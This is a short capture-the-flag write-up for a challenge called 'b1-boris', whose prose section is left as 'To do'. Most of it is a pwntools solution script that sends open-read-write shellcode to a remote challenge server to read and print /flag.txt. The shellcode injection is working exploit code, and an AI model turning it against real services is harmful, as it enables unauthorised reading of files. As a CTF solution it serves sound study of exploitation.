# b1-boris
## TLDR
Simple orw to read flag

## Complete write up
To do

## Solution
```py
#!/usr/bin/python2
from pwn import *
from sys import *

context.arch = "amd64"
# context.arch = "i386"

e = ELF('boris')
if(len(argv) == 2):
    p = connect("193.57.159.27", 22431)
else:
    p = process('boris')


cmd = """
b *0x0000555555554000+0x00000000000014CC
"""
if(len(argv) == 3):
    gdb.attach(p, cmd)

pload  = shellcraft.openat(-100, "/flag.txt", 0)
pload += "mov rbp, rax\n"
pload += shellcraft.read("rbp", "rsp", 500)
pload += shellcraft.write(1, "rsp", 500)
pload = asm(pload)
print disasm(pload)
pause()
p.sendline(pload)
p.interactive()
```

![](Pasted%20image%2020211011130108.png)